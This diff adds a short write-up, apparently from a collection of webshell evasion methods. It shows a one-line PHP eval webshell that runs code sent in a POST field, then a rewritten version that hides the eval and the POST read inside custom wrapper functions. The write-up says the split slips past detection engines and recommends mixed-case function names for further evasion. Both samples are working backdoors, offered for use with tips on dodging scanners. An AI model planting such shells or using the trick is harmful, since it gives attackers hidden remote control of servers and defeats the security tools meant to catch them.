@@ -1,0 +1,32 @@
+Original webshell sample:
+
+'''
+<?php @eval($_POST['110']);?>
+'''
+
+Webshell obtained after using the corresponding method:
+
+'''
+<?php
+
+ function aaa($a){
+     return $a;
+ }
+ function bbb($b){
+     return eval($b);
+ }
+ function post(){
+     return @$_POST['110'];
+ }
+ function run(){
+     return aaa(bbb)(aaa(post)());
+ }
+
+ aaa(bbb)(aaa(post)());
+
+?>		
+'''
+
+Description:
+
+This method bypasses the detection engine by spliting the malicious commands ar the core of the webshell by means of several custom function. In addition, when the custom function name and the sensitive function name is the same, it is recommended to bypass it by using a mixed-case method, which can further enhance the effect of anti-killing.
